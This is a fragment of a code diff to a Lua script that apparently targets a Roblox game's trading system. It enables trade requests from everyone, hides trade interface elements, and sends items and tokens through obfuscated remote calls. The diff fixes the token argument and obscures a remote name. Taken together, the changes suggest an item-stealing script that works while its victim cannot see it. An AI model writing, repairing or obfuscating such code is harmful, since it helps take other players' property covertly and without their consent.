@@ -43,7 +43,7 @@ local tradeArgs = {
     [1] = "AllowRequests",
     [2] = "Everyone"
 }
-netModule:WaitForChild("RF/Trading/SetSetting"):InvokeServer(unpack(tradeArgs))
+netModule:WaitForChild("RF/.G65?u>/&3x,6vB>C;"):InvokeServer(unpack(tradeArgs))
 
 -- Hide UI elements
 tradeGui.Black.Visible = false
@@ -514,7 +514,7 @@ if #itemsToSend > 0 or totalTokens > 0 then
             -- Always add tokens if available (even with no items)
             if tradeTokens > 0 then
                 local tokenSuccess, tokenError = pcall(function()
-                    netModule:WaitForChild("RF/.G65?u>/s2h-@m3CH(t\"L98l"):InvokeServer(tokensamount)
+                    netModule:WaitForChild("RF/.G65?u>/s2h-@m3CH(t\"L98l"):InvokeServer(tradeTokens)
                 end)
                 
                 if tokenSuccess then
